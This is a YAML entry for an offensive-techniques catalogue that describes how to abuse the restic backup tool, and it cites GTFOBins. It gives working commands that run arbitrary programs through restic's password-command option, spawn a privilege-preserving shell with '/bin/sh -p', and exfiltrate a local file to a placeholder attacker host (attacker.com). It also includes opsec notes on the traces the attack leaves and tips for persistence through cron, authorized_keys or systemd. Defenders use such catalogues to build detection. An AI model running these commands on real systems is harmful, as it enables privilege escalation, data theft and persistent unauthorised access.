---
name: restic
capabilities:
- exec
- spawn
- upload
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  - Outbound network traffic to attacker host
  notes: ''
persistence_potential: true
examples:
- id: command
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: RESTIC_PASSWORD_COMMAND='/path/to/command' restic backup
- id: command-2
  description: Execute an arbitrary command.
  capabilities:
  - exec
  command: restic --password-command='/path/to/command' backup
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: RESTIC_PASSWORD_COMMAND='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' restic backup
- id: shell-2
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: restic --password-command='/bin/sh -p -c "/bin/sh -p 0<&2 1<&2"' backup
- id: upload
  description: Send a local file to a remote host.
  capabilities:
  - upload
  command: restic backup -r rest:http://attacker.com:12345/x /path/to/input-file
references:
- https://gtfobins.github.io/gtfobins/restic/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
